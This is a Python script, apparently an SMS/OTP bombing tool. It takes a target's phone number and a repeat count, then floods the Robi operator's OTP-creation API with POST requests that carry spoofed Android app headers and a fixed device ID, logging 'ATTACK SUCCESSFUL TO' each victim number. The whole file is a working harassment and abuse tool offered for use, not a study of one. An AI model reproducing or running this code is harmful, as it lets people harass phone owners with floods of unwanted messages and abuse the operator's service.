import requests
import logging
import os

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def is_valid_msisdn(msisdn):
    # Add your own validation logic here
    return msisdn.isdigit() and len(msisdn) in [10, 11, 13]

def get_headers():
    return {
        "token": "",
        "platform": "android",
        "appname": "robi_lite",
        "locale": "en",
        "deviceid": "e602fe23371a73a6",
        "appversion": "1000004",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "20",
        "Host": "singleapp.robi.com.bd",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.12.0"
    }

def send_request(full_msisdn):
    headers = get_headers()
    data = {"msisdn": full_msisdn}
    try:
        response = requests.post("https://singleapp.robi.com.bd/api/v1/tokens/create_opt", headers=headers, data=data)
        response.raise_for_status()
        logging.info(f"ATTACK SUCCESSFUL TO {full_msisdn}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {e}")

def main():
    while True:
        msisdn = input("Enter MSISDN (or type 'exit' to quit): ")
        if msisdn.lower() == 'exit':
            break

        if not is_valid_msisdn(msisdn):
            logging.error("Invalid MSISDN format.")
            continue

        amount = input("Enter amount: ")
        if not amount.isdigit():
            logging.error("Amount must be a number.")
            continue

        full_msisdn = "88" + msisdn
        amount = int(amount)

        for _ in range(amount):
            send_request(full_msisdn)

if __name__ == "__main__":
    main()